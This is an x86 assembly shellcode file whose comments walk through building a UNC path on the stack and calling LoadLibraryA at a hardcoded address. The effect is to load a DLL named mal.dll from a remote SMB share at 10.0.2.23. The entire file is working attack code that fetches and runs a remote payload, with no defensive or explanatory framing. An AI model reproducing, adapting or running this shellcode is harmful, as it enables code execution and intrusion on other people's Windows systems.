; filename: shellcode.asm
; section .text
; global _start

; _start:

sub esp,0x64            ; Move ESP pointer above our initial buffer to avoid
                        ; overwriting our shellcode
xor ebx,ebx             ; Zero out EBX that will be the NULL byte terminating
                        ; the UNC path
push ebx                ; PUSH NULL byte
push 0x6c6c642e          
push 0x6c616d5c         
push 0x64636261         
push 0x5c33322e         
push 0x322e302e         
push 0x30315c5c         


push esp                ; Push pointer of the UNC path
mov ebx,0x75cb0fb0
call ebx
mov ebx,0x75cb0dc0      ; Move into EBX the address of 'LoadLibraryA'
call ebx                ; call 'LoadLibraryA("\\10.0.2.23\abcd\mal.dll")'
